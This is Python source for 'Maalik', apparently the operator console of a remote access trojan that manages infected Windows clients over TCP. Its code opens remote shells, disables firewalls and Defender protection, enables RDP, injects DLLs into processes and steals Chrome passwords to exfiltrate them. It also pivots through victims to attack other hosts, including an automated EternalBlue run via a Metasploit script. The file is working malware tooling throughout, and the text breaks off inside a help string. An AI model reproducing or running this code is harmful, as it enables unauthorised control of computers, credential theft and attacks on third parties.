import socket
import _thread
import configparser
from colorama import Fore, Style
import colorama
import os
from .other import *
from .updates import current_version
import time
import subprocess
import sys
import random

clients = [] # A List for client sockets
hostList = [] # A list for Client userpcs
iplist = [] # A List for Client IP's and Port as string
log = [] # Must not exceed 1

silent = False
shellmode = False  # ( ͡° ͜ʖ ͡°)

class ClientManage:
    def __init__(self, client_socket):
        self.client_socket = client_socket

    global iplist
    remote_hosts_list = [] # List of scanned hosts
    open_ports_list = [] # List of open ports
    attack_host = [] # The host set to attack, must not exceed 1
    attack_port = [] # The port set to attack, must not exceed 1
    exploit_port = [] # The port used for exploitation, must not exceed 1

    def Log(self, data):
        del log[:]
        log.append(data)

    def clearLog(self):
        del log[:]

    def returnClientInfo(self):
        """
        return basic client information
        """
        location = clients.index(self.client_socket)
        return "Index : " + str(location) + " - IP : " + str(iplist[location]) + " - " + hostList[location]

    def SendData(self, data):
        try:
            self.client_socket.send(data.encode())
        except Exception as error:
            self._clearKick()
            print("Error Occured : " + str(error))

    def SendBytes(self, data):
        try:
            self.client_socket.send(data)
        except Exception as error:
            self._clearKick()
            print("Error Occured : " + str(error))

    def _clearKick(self):
        '''
        clear lists and kick
        '''
        location = clients.index(self.client_socket)
        clients.remove(clients[location])
        iplist.remove(iplist[location])
        hostList.remove(hostList[location])

    def DIRMONITOR(self, check_a_file):
        location = clients.index(self.client_socket)
        ip = iplist[location]
        while(True):
            try:
                if(silent == True):
                    if(check_a_file is not None):
                        self.SendData("ls")
                        if(check_a_file in str(log)):
                            break
                        time.sleep(2)
                else:
                    clear_screen()
                    print(dirmonitor.format(ip = ip))
                    self.SendData("ls")
                    time.sleep(2)
            except KeyboardInterrupt:
                print("[x] Stopped Monitoring Current Directory.")
                break

    def PROCESS_MONITOR(self, pname = None):
        location = clients.index(self.client_socket)
        ip = iplist[location]
        if(pname == None):
            pname = input("[+] Enter Process Name : ")
        if(len(pname) > 0):
            silent = True
            print("[i] Press CTRL+C to Quit Process Monitor.")
            print(procmonitor.format(ip = ip))
            while(True):
                try:
                    self.SendData("procmonitor")
                    self.SendData(pname)
                    time.sleep(2)
                except KeyboardInterrupt:
                    print("[x] Stopped Monitoring Process : " + pname)
                    self.SendData("procstop")
                    silent = False
                    break


    def BuildPayload(self, payload):
        os.chdir("../payloads")
        print("[+] Building {x}..".format(x = payload.capitalize()))
        subprocess.call("mingw32-make {x}".format(x= payload),stdout=subprocess.PIPE)

    def Session(self):
        global silent
        global shellmode
        session = True

        def AutoAttack():
            # Get all settings
            # Forward port
            # Create Metasploit RC File.
            # Run the Metasploit RC File.

            if(self.attack_port[0] == "445"):
                cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                    lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
                )
                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
                print("[+] Forwarding Port.")

                
                
                self.SendData("cmd.exe /c " + cmdstr)
                self.WaitForReply()
                time.sleep(2)
                print("[+] Disabling firewall.")
                
                self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                self.WaitForReply()
                with open("maalik_attack.rc", "w+") as rcfile:
                    rcfile.write("use exploit/windows/smb/ms17_010_eternalblue\n")
                    rcfile.write("set payload generic/shell_reverse_tcp\n")
                    rcfile.write("set LHOST 0.0.0.0\n")
                    rcfile.write("set RHOST " + str(ip.split(":")[0]) + "\n")
                    rcfile.write("set RPORT " + str(self.exploit_port[0]) + "\n")
                    rcfile.write("run")

                try:
                    subprocess.call(["msfconsole", "-r", "maalik_attack.rc"])
                    
                    self.SendData("cmd.exe /c netsh interface portproxy reset")
                    self.WaitForReply()
                    print("[+] Enabling firewall.")
                    
                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
                    self.WaitForReply()
                    
                except OSError as e:
                    if e.errno == errno.ENOENT:
                        print("[X] Failed to run Metasploit, Is it installed?")
                    else:
                        print("[X] Failed to run Metasploit, Error : " + str(e))
                
            else:
                print("[*] Incompatible port for Auto Pivot Exploit.")
                print("[*] Supported Ports is 445 (smb) for Eternalblue.")
                        
        def Attack():
            if(len(self.exploit_port) == 0):
                self.exploit_port.append(random.randint(1000, 9000))
            else:
                cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}".format(
                    lp = self.exploit_port[0], cp = self.attack_port[0], ca = self.attack_host[0]
                )
                print("[+] Attacking " + self.attack_host[0] + " from " + ip.split(":")[0])
                print("[+] Forwarding Port.")

                
                
                self.SendData("cmd.exe /c " + cmdstr)
                self.WaitForReply()
                time.sleep(2)
                print("[+] Disabling firewall.")
                
                self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                self.WaitForReply()
                print("[+] Run your Exploits on " + ip.split(":")[0] + " on Port " + str(self.exploit_port[0]) + ".")
                print("[+] All Traffic sent on " + ip.split(":")[0] + ":" + str(self.exploit_port[0]) + " will be forwarded to " + self.attack_host[0] + ":" + self.attack_port[0])
                print("[*] Press CTRL+C when Done.")
                while(True):
                    try:
                        input("")
                    except KeyboardInterrupt:
                        
                        self.SendData("cmd.exe /c netsh interface portproxy reset")
                        self.WaitForReply()
                        
                        break

        def filetransfer(mfile = None, rfile=None):
            if(mfile == None and rfile == None):
                mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File Path : ")
                rfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File name to Save as : ")
                
            if(":" in rfile):
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] ':' is forbidden in filename.")
            else:
                try:
                    with open(mfile, "rb") as sendfile:
                        data = sendfile.read()
                        bufferst = os.stat(mfile)
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                        
                        self.SendData("frecv") # Send File Receive trigger for client
                        trigger = rfile + ":" + str(bufferst.st_size) 
                        time.sleep(1)
                        self.SendData(trigger) # Send Trigger
                        self.SendBytes(data) # Send file
                        print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                        self.WaitForReply()
                except FileNotFoundError:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '{file}' not found!?".format(file = mfile))
                except Exception as e:
                    print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))
        
        def DLLTransfer(mfile=None, proc=None):
            if(mfile == None and proc == None):
                mfile = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] DLL Path : ")
                proc = input("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Process Name : ")
            try:
                with open(mfile, "rb") as sendfile:
                    data = sendfile.read()
                    bufferst = os.stat(mfile)
                    #print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] File opened " + mfile + " ("+str(bufferst.st_size) + " bytes)" )
                    
                    self.SendData("fdll") # Send File Receive trigger for client
                    time.sleep(1)
                    trigger =  "maalikloader" + ":" + str(bufferst.st_size) + ":" + proc
                    self.SendData(trigger) # Send Trigger
                    self.SendBytes(data) # Send file
                    #print("["+Style.BRIGHT + Fore.LIGHTBLUE_EX + "*" + Style.RESET_ALL + "] Uploading file.")
                    self.WaitForReply()
            except FileNotFoundError:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] '{file}' not found!?".format(file = mfile))
            except Exception as e:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error : " + str(e))

        def DLLGetOutput():
            self.SendData("dlloutput")
            self.WaitForReply()
    
        while(session):
            try:
                try:
                    location = clients.index(self.client_socket)
                    if not shellmode:
                        shellmode = True

                except ValueError:
                    print("[X] Client disconnected unexpectedly, Session closed.")
                    shellmode = False
                    session = False
                    break
                ip = iplist[location]
                main = input(Style.BRIGHT + Fore.LIGHTCYAN_EX + "maalik >> ({ip}) : ".format(ip = ip) + Style.RESET_ALL)
                if(main == "ls"):
                    
                    self.SendData("listdir")
                    self.WaitForReply()
                    
                elif(main == "osinfo"):
                    self.SendData("osinfo")
                    self.WaitForReply()
                elif(main.startswith("cd")):
                    sp = main.split()
                    try:
                        self.SendData("cd")
                        self.SendData(sp[1])
                        self.WaitForReply()
                    except IndexError:
                        print(Style.BRIGHT + Fore.RED + "[X] Error : Usage is cd < dir > ")
                elif(main == "execute"):
                    filename = input("[:] Enter Filename to Execute : ")
                    if(len(filename) > 0):
                        self.SendData("exec")
                        self.SendData(filename)
                 
                elif(main == "execargs"):
                    filename = input("[:] Enter Filename to Execute : ")
                    args = input("[:] Command line arguments : ")
                    if(len(filename) > 0 and len(args) > 0):
                        self.SendData("execargs:"+filename+":"+args)
                        self.WaitForReply()
                elif(main == "shell"):
                    shell = True
                    
                    while (shell):
                        sh = input(Style.BRIGHT + "( " + Fore.RED + ip + Style.RESET_ALL + Style.BRIGHT + " ) > ")
                        if(len(sh) > 0):
                            if(sh != "exit"):
                                self.SendData("cmd.exe /c "+ sh)
                                self.WaitForReply()
                            else:
                                shell = False
                                
                                break
                            
                elif(main == "exit"):
                    shellmode = False
                    session = False
                    break

                elif(main == "delete"):
                    dlt = input("[:] Enter Filename to Delete : ")
                    if(len(dlt) > 0):
                        self.SendData("delete:"+dlt)
                        self.WaitForReply()
                elif(main == "process_monitor"):
                    self.PROCESS_MONITOR()
                elif(main == "dir_monitor"):
                    self.DIRMONITOR(None)

                elif(main == "netuser"):
                    
                    self.SendData("cmd.exe /c net user")
                    self.WaitForReply()
                elif(main == "driverquery"):
                    
                    self.SendData("cmd.exe /c driverquery")
                    self.WaitForReply()
                elif(main == "tasklist"):
                    
                    self.SendData("cmd.exe /c tasklist")
                    self.WaitForReply()
                elif(main == "drives"):
                    
                    self.SendData("cmd.exe /c fsutil fsinfo drives")
                    self.WaitForReply()
                elif(main == "set"):
                    
                    self.SendData("cmd.exe /c set")
                    self.WaitForReply()
                elif(main == "qwinsta"):
                    
                    self.SendData("cmd.exe /c qwinsta")
                    self.WaitForReply()
                elif(main.startswith("port_scan")):
                    if(len(self.attack_host) > 0):
                        ip = self.attack_host[0]
                    else:
                        ip = input("[+] Enter IP : ")
                    if(len(ip) > 0):
                        silent = True
                        while(True):
                            try:
                                with open("common_ports", "r") as commonportlist:
                                    lines = commonportlist.readlines()
                                    for line in lines:
                                        port = line.split(" ")[1].strip()
                                        self.SendData("scanip")
                                        self.SendData(ip +","+port)
                                        time.sleep(2)
                                    break
                            except KeyboardInterrupt:
                                silent = False
                                break

                elif ( main == "clientinfo"):
                    self.SendData("clientinfo")
                    self.WaitForReply()
                elif ( main == "netshall"):
                    
                    self.SendData("cmd.exe /c netsh wlan show all")
                    self.WaitForReply()
                elif ( main == "windefender_exclude"):
                    path = input("[+] Path on Remote PC ( File / Folder ) : ")
                    if(len(path) > 0):
                        self.SendData("exclude")
                        self.SendData(path)
                        

                elif ( main == "systeminfo"):
                    self.SendData("systeminfo")
                    self.WaitForReply()

                elif ( main == "rdp_enable"):
                    
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop on.")
                    
                    self.SendData('cmd.exe /c reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
                    self.WaitForReply()
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Disabling Firewall.")
                    
                    self.SendData('cmd.exe /c netsh advfirewall firewall set rule group="remote desktop" new enable=yes')
                    self.WaitForReply()
                    

                elif ( main == "rdp_disable" ):
                    
                    print("["+Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] Turning Remote Desktop off.")
                    
                    self.SendData('cmd.exe /c reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
                    self.WaitForReply()
                    
                    
                elif ( main == "portfwd"):
                    cmdstr = "netsh interface portproxy add v4tov4 listenport={lp} listenaddress=0.0.0.0 connectport={cp} connectaddress={ca}"
                    listen_port = input("[+] Enter Port to Listen for Connection : ")
                    connect_addr = input("[+] Enter Host to Forward Connection to : ")
                    connect_port = input("[+] Enter Port to Forward Connection to : ")
                    newstr = cmdstr.format(lp = listen_port, cp = connect_port, ca = connect_addr)
                    print(newstr)
                    
                    self.SendData("cmd.exe /c " + newstr)
                    self.WaitForReply()

                elif( main == "portfwd_reset"):
                    
                    self.SendData("cmd.exe /c netsh interface portproxy reset")
                    self.WaitForReply()
                elif( main == "network_scan"):
                    try:
                        iprange = input("[" + Style.BRIGHT +  Fore.LIGHTYELLOW_EX + "^" + Style.RESET_ALL + "] Enter Range (eg: 192.168.0.1/24) : ")
                        scanRange = iprange.split("/")
                        start = scanRange[0]
                        get = start.split(".")
                        end = scanRange[1]
                        xip = get[3]
                        base = get[0] +"."+ get[1] +"."+ get[2] +"."
                        silent = True
                        try:
                            for i in range(int(xip), int(end)):
                                ip_toscan = base + str(i)
                                #print("Scanning : " + ip_toscan)
                                self.SendData("checkhost")
                                self.SendData(ip_toscan)
                                self.WaitForReply()
                            
                        except KeyboardInterrupt:
                            silent = False
                            
                        silent = False
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif(main == "show targets"):
                    if(len(self.remote_hosts_list) > 0):
                        for host in self.remote_hosts_list:
                            print("[" + Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + host)
                    else:
                        print("[" + Style.BRIGHT + Fore.RED + "x" + Style.RESET_ALL + "] Error : No Hosts scanned.")
                        
                elif(main == "clear_hosts"):
                    confirm = input("[X] Confirm Clear hosts? You will need to Rescan! (y/n) : ")
                    if(confirm.lower() == "y"):
                        del self.remote_hosts_list[:]

                elif ( main == "clear_ports"):
                    confirm = input("[X] Confirm Clear Ports? You will need to Rescan! (y/n) : ")
                    if(confirm.lower() == "y"):
                        del self.open_ports_list[:]
                
                elif(main.startswith("set target")):
                    try:
                        
                        parse = main.split(" ")
                        target = parse[2]
                        if(len(self.attack_host) > 0):
                            print("[+] Removing " + self.attack_host[0] + " as set target.")
                            del self.attack_host[:]
                        self.attack_host.append(target)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Target => " + self.attack_host[0])
                    except Exception as e:
                        print("Error : " + str(e))

                elif(main.startswith("set attackport")):
                    try:
                        
                        parse = main.split(" ")
                        atport = parse[2]
                        if(len(self.attack_port) > 0):
                            print("[+] Removing " + self.attack_port[0] + " as set Attack Port.")
                            del self.attack_port[:]
                        self.attack_port.append(atport)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Attack Port => " + self.attack_port[0])
                    except Exception as e:
                        print("Error : " + str(e))                    

                elif(main.startswith("set exploitport")):
                    try:
                        parse = main.split(" ")
                        export = parse[2]
                        if(len(self.exploit_port) > 0):
                            print("[+] Removing " + self.exploit_port[0] + " as set Exploit Port.")
                            del self.exploit_port[:]
                        self.exploit_port.append(export)
                        print(Style.BRIGHT + Fore.LIGHTWHITE_EX + "[+] Exploit Port => " + self.exploit_port[0])
                    except Exception as e:
                        print("Error : " + str(e))  

                elif(main == "show info"):

                    def GetPorts(target):
                        x = []
                        ret = ""
                        for i in self.open_ports_list:
                            if target in i:
                                x.append(i)

                        for showport in x:
                            ret += showport.split(":")[1] + "\n"

                        return ret
                    try:
                        if(len(self.attack_host) > 0):
                       
                            infomsg = """
Target IP : {targetip}
Open Ports
---------------------
{openports}
                        """.format(targetip = self.attack_host[0],openports = GetPorts(self.attack_host[0]))
                            print(infomsg)
                        else:
                            print("[X] No Target is set.")
                    except Exception as e:
                        print("Error : " + str(e))

                elif(main == "show options"):
                    attackIP = ""
                    attackport = ""
                    randport = 0
                    if(len(self.attack_host) > 0):
                        attackIP = self.attack_host[0]
                    else:
                        attackIP = None

                    if(len(self.attack_port) > 0):
                        attackport = self.attack_port[0]
                    else:
                        attackport = None

                    if(len(self.exploit_port) > 0):
                        randport = self.exploit_port[0]
                    else:
                        randport = random.randint(1000, 9000)

                    help_msg = r"""
        Maalik Options

        Attack Target
        --------------
        {attackIP}

        Attack Port
        -----------
        {attackport}

        Exploit Port
        -----------
        {randport} (default is random)

        Attack Details
        --------------
        [ Exploit ] --> {clientip}:{randport} --> {attackIP}:{attackport}

                    """.format(clientip = Style.BRIGHT + ip.split(":")[0], attackIP = attackIP, attackport = attackport, randport = randport)

                    print(help_msg)

                elif(main == "run"):
                    try:
                        Attack()
                    except IndexError:
                        print('[X] One or more required values are not set.')
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif(main == "run autoblue"):
                    try:
                        if(len(self.exploit_port) > 0):
                            pass
                        else:
                            self.exploit_port.append(random.randint(1000, 9000))
                        
                        AutoAttack()
                    except IndexError:
                        print('[X] One or more required values are not set.')
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif(main == "firewall_on"):
                    
                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state on")
                    self.WaitForReply()

                elif(main == "firewall_off"):
                    
                    self.SendData("cmd.exe /c netsh advfirewall set currentprofile state off")
                    self.WaitForReply()
                    
                elif(main == "tasklist"):
                    
                    
                    self.SendData("cmd.exe /c tasklist")
                    self.WaitForReply()
                    

                elif(main == "taskkill"):
                    processname = input("[?] Enter Process name : ")
                    if(len(processname) > 0):
                        
                        self.SendData("cmd.exe /c taskkill /IM " + processname + " /F")
                        self.WaitForReply()
                        
                elif(main == "host_sweep"):
                    try:
                        if((len(self.remote_hosts_list)) > 0):
                            for host in self.remote_hosts_list:
                                self.SendData("gethostname")
                                self.SendData(host.strip().split("-")[0])
                                self.WaitForReply()
                    except Exception as e:
                        print("[X] Error : " + str(e))
                
                elif(main == "host_sweep -h"):
                    try:
                        ip = input("[?] Enter IP : ")
                        if(len(ip) > 0):
                            self.SendData("gethostname")
                            self.SendData(ip)
                            self.WaitForReply()
                    except Exception as e:
                        print("[X] Error : " + str(e))

                elif(main == "upload"):
                    
                    filetransfer()
                    time.sleep(2)
                    
                elif(main == "download"):
                    filename = input("[+] File : ")
                    if(len(filename) > 0):
                        self.SendData("fupload:"+filename)
                        self.WaitForReply()
                        time.sleep(5)

                elif(main == "dllinject"):
                    
                    DLLTransfer()
                    
                elif(main == "help"):
                    print(help)

                elif(main == "elevate"):
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                    DLLTransfer("payloads/elevate.dll", "Fhdawn.exe") # Inject elevate.dll in Fhdawn.exe
                    print( Style.BRIGHT + Fore.CYAN + "[ + ] Payload Output : \n------------------\n" + Style.RESET_ALL)
                    DLLGetOutput()
                
                elif(main == "chromedump"):
                    print(Style.BRIGHT + Fore.LIGHTCYAN_EX + "[~]" + Style.RESET_ALL + " Injecting Payload.")
                    DLLTransfer("payloads/ChromeDump.dll", "Fhdawn.exe") # Inject ChromeDump.dll in Fhdawn.exe
                    self.SendData("fupload:passwords.txt")
                    time.sleep(2)
                    self.SendData("delete:passwords.txt")
                    self.WaitForReply()
            except KeyboardInterrupt:
                print("[X] Interrupt, Type exit to Exit session.")

    def WaitForReply(self):
        """
        Wait 20 seconds for Message from Client
        """
        self.clearLog() # Clear log list
        x = 0 # x is 0
        while(x != 20): # while x is not 20
            try: 
                if(len(log) > 0): # If length of log is greater than 0, means message received. So break the loop
                    break # break here
                time.sleep(1) # Sleep 1 second
                x += 1 # Add one to x
                if(x == 20):
                    print( Style.BRIGHT + Fore.RED + "[i]" + Style.RESET_ALL + " 20 seconds have passed and we have received no response from Fhdawn. There may be a problem.")
            except KeyboardInterrupt:
                break # Keyboard interrupt, Breaks the loop.

    def ClientThread(self):
        
        """
        Receive data from client
        """
        global silent
        global shellmode

        def uniquify(path):
            """
            Credits : https://stackoverflow.com/questions/13852700/create-file-but-if-name-exists-add-number/57896232#57896232
            """
            filename, extension = os.path.splitext(path)
            counter = 1

            while os.path.exists(path):
                path = filename + " (" + str(counter) + ")" + extension
                counter += 1

            return path

        while(True):
            try:
                client_data = self.client_socket.recv(1024).decode()
                
                if(not client_data):
                    self._clearKick()
                    break 

                self.Log(client_data)

                try:
                    indexof = clients.index(self.client_socket)
                    ips = iplist[indexof]
                except Exception as e:
                    print("[X] Error : " + str(e))
                    pass
                
                # Fhdawn reporting an Open Port on a Host
                if(client_data.startswith("OPENPORT")):
                    # OPENPORT:IP,Port
                    parse = client_data.split(":")
                    ip_port = str(parse[1]).split(",")
                    with open("common_ports", "r") as portlist:
                        lines = portlist.readlines()
                        for line in lines:
                            if(ip_port[1] in line):
                                # if port in list
                                ipport = ip_port[0] + ":" + ip_port[1]
                                print("["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + ipport + Style.BRIGHT + Fore.GREEN + " <--> " + Style.RESET_ALL + line )
                                if(ipport not in self.open_ports_list):
                                    self.open_ports_list.append(ipport)
                                break
                      
                elif(client_data.startswith("[HOST]")):
                    hostinfo = client_data.replace("[HOST]", "")
                    print("[" + Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] " + hostinfo)
                    if("-pc" in hostinfo.lower()): # batman-PC
                        print(" |_ "+ Style.BRIGHT + Fore.GREEN + " OS " + Style.RESET_ALL + " : Windows (Just guessing)")
                    if(hostinfo not in self.remote_hosts_list):
                        self.remote_hosts_list.append(hostinfo)
                
                # Fhdawn wants to send us a file
                elif(client_data.startswith("FILE")):
                    try:
                        fileinfo = client_data.split(":") #FILE:filename.txt:555
                        #print(fileinfo)
                        filename = fileinfo[1]
                        filesize = int(fileinfo[2])
                        SaveFile = "downloads/"+ filename
                        FinalF = uniquify(SaveFile)

                        with open(FinalF, "wb") as incoming_file:
                            data = self.client_socket.recv(4096)
                           
                            print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloading file '{fl}' in '{fd}'".format(fl=filename, fd=FinalF))
                            while(len(data) != filesize):
                                data += self.client_socket.recv(filesize - len(data))  
                                #print("data = " + str(len(data)) + " filesize = " + str(filesize))
                                if not data: break
                            incoming_file.write(data)
                        print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Downloaded '{fl}' => '{fd}'".format(fl=filename, fd=FinalF))

                    except Exception as e:
                        print("[X] Error : " + str(e))
                        print("[i] File Download Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                
                # File was recevied by Fhdawn
                elif(client_data.startswith("F_OK")):
                    try:
                        fileinfo = client_data.split(",") # split info by comma
                        print(
                            Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Uploaded {filename} ({filesize} bytes) to '{remote_path}' ..."
                            .format(filename = fileinfo[1], filesize = fileinfo[2], remote_path = fileinfo[3]))

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] File Received Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass

                # Reflective DLL Injection was successfully done    
                elif(client_data.startswith("DLL_OK")):
                    try:
                        fileinfo = client_data.split(":")
                        print(Style.BRIGHT + "[" + Fore.GREEN + "+" + Style.RESET_ALL + Style.BRIGHT + "] Injected Reflective DLL into PID " + fileinfo[1] + " ...")

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] Reflective DLL Inject Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                            
                elif(client_data.startswith("DEL_OK")):
                    try:
                        fileinfo = client_data.split(",")
                        print( "[" + Fore.LIGHTGREEN_EX + Style.BRIGHT + "i" + Style.RESET_ALL + "] File '{file}' deleted from '{pth}' ..." .format(file = fileinfo[1], pth = fileinfo[2] ))

                    except Exception as Error:
                        print("[X] Error : " + str(Error))
                        print("[i] File Delete Information : " + client_data)
                        # Rare case, This will only happen if Fhdawn has sent invalid triggers.
                        print("[i] Please report this bug to developer with the information above.")
                        pass
                elif(shellmode == True):
                    print("\n"+client_data) # No other information

                else:
                    if(silent == False):
                        print("\n["+ Style.BRIGHT + Fore.GREEN + "+" + Style.RESET_ALL + "] {ips} : ".format(ips = ips) + client_data)
                    
            except Exception as e:
                self._clearKick()
                print("[X] Error : " + str(e))
                break
            except UnicodeDecodeError as ude:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Decode error : " + str(ude))
            except UnicodeEncodeError as eEe:
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Unicode Encode error : " + str(eEe))
            except ConnectionAbortedError as cAe:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cAe))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionError as cE:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cE))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionRefusedError as cRe:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cRe))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except ConnectionResetError as cRetwo:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(cRetwo))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

            except socket.error as se:
                   
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(se))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break
            
            except Exception as recv_error:
                self._clearKick()
                print("["+Style.BRIGHT + Fore.RED + "X" + Style.RESET_ALL + "] Error Occured : " + str(recv_error))
                print("["+Style.BRIGHT + Fore.LIGHTGREEN_EX + "+" + Style.RESET_ALL + "] Online : " + str(len(clients)))
                break

def setting(key):
    config = configparser.ConfigParser()
    config.read('settings.ini')
    return config['DEFAULT'][key]


def TCPServer():
    global iplist
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPIDLE, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPINTVL, 1)
    server.setsockopt(socket.SOL_TCP, socket.TCP_KEEPCNT, 5)

    host = setting('host')
    port = int(setting('port'))

    try:
        server.bind((host, port))
    except PermissionError:
        print("[X] No Permission to bind.")
        exit(True)
    except Exception as i:
        raise i

    try:
        server.listen(1)
    except Exception as S:
        raise S

    #print("[I] Server Running.")
    while(True):
        client, addr = server.accept()
        client.send("fhdawn_host".encode())
        try:
            host = client.recv(1024).decode() # Receive User PC ' Test / TEST-PC '. I call this host. And all of these are saved in hostList
            if("/" not in host):
                print(Style.BRIGHT + Fore.YELLOW + "[ WARNING ] " + Style.RESET_ALL + "Client has sent an invalid User PC. This *may* not be Fhdawn.")
        except Exception as e:
            print(str(e))
            break
        cld = ClientManage(client)
        clients.append(client)
        client_ip = str(addr[0]) +":"+ str(addr[1])
        iplist.append(client_ip)
        hostList.append(host)
        print( Style.BRIGHT + Fore.GREEN + "\n[ Session Opened ] " + Style.RESET_ALL + cld.returnClientInfo())
        _thread.start_new_thread(cld.ClientThread, ())


def Console():
    global iplist
    def SendData(csocket, data):
        csocket = int(csocket)
        sockfd = clients[csocket]
        
        try:
            sockfd.send(data.encode())
        except Exception as error:
            clients.remove(sockfd)
            print("Error Occured : " + str(error))

    def list_bots():
        print("\nActive Sessions (" + str(len(clients)) +")")
        print("===================================")
        try:
            if(len(clients) > 0): 
                for i in range(len(iplist)):
                    print(  
                        "\n[ SESSION ID : "+str(i) +" ][ Connection : "+iplist[i] + " ][ " + hostList[i] + " ]" 
                        )
        except Exception as stre:
            print("Error : " + str(stre))

    clear_screen()
    print(banner.format(ver = current_version()))
    _thread.start_new_thread(TCPServer, ()) 
    global silent
    while(True):
        try:
            if(silent == False):
                inputstr = Style.BRIGHT + Fore.LIGHTGREEN_EX + "maalik >> " + Style.RESET_ALL + Style.BRIGHT
                x = input(inputstr)
                args = x.split()
                if(x == "list" or x == "sessions"):
                    list_bots()
                elif(x.startswith("session")):
                    try:
                        cid = args[1]
                        sock = clients[int(cid)]
                        sess = ClientManage(sock)
                        sess.Session()
                    except IndexError:
                        print("USAGE : session < client id >")
                elif(x.startswith("send")):
                    try:
                        cid = args[1]
                        SendData(cid, args[2])
                    except IndexError:
                        print("USAGE : send <id> <data>")
                elif(x == "exit"):
                    sys.exit(1)
                elif(x == "help"):
                    print(Style.BRIGHT + Fore.GREEN + 
                        """
                        Maalik
                        ---------------
                        -> Commands : 
                        -. help - Print this help message.
                        -. send - send data to client (dev only - remove later).
                        -. sessions - View online clients.
